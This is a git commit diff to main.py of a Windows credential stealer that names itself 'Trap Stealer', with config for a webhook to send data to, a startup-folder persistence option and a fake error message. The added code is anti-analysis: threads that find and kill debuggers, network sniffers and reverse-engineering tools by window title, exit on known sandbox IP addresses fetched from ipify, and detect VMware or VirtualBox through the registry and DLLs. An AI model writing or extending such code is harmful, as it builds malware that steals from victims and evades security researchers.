90b7097bffb282f7a70029942a0ea2a843d59263
TheCuteOwl <114611129+TheCuteOwl@users.noreply.github.com>
2023-04-29 13:03:10 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,5 @@
+# Import dont mind
+
 import os 
 from os import getenv, startfile
 import threading
@@ -7,6 +9,7 @@ from base64 import b64decode
 from json import loads as json_loads, load
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from urllib.request import Request, urlopen
+import urllib.request
 from json import loads, dumps
 import time
 from zipfile import ZipFile
@@ -14,17 +17,90 @@ import re
 import subprocess
 import socket, getpass, ctypes
 from PIL import ImageGrab
-import string
+import string, platform
 from shutil import copy
 from os.path import isfile, join
+import winreg
+
+
+
 ### CONFIG ### 
+webhook = '' #Put ur webhook
+
 fakeerror = True # If True it will make an fake error message at the end
 Startup = True # If True it will add the file into the startup folder
 shitty_message = True # If True it will print fake message, if you want to disable it replace with False
-
-webhook = '' #Put ur webhook
-
+antidebugging = True # If set to false it will dont check for VM or Debugger
 StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
+
+
+def antidebug():
+    checks = [check_windows, check_ip, check_registry, check_dll]
+    for check in checks:
+        t = threading.Thread(target=check, daemon=True)
+        t.start()
+
+def exit_program(reason):
+    print(reason)
+    ctypes.windll.kernel32.ExitProcess(0)
+
+def check_windows():
+    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
+    def winEnumHandler(hwnd, ctx):
+        title = ctypes.create_string_buffer(1024)
+        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
+        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit'}:
+            pid = ctypes.c_ulong(0)
+            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+            if pid.value != 0:
+                try:
+                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
+                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
+                    ctypes.windll.kernel32.CloseHandle(handle)
+                except:
+                    pass
+            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
+        return True
+
+    while True:
+        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
+
+def check_ip():
+    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}    
+    while True:
+        try:
+            ip = urllib.request.urlopen('https://api64.ipify.org/').read().decode().strip()
+            if ip in blacklisted:
+                exit_program('Ip Blacklisted')
+            return
+        except:
+            pass
+
+def check_registry():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
+        subkey_count = winreg.QueryInfoKey(key)[0]
+        for i in range(subkey_count):
+            subkey = winreg.EnumKey(key, i)
+            if subkey.startswith('VMWARE'):
+                exit_program('Detected Vm')
+        winreg.CloseKey(key)
+    except:
+        pass
+
+def check_dll():
+    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
+    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
+        exit_program('Detected Vm')
+
+
+try:
+    if antidebugging == True:
+        antidebug()
+    else:
+        pass
+except:
+    pass
 
 
 if shitty_message == True:
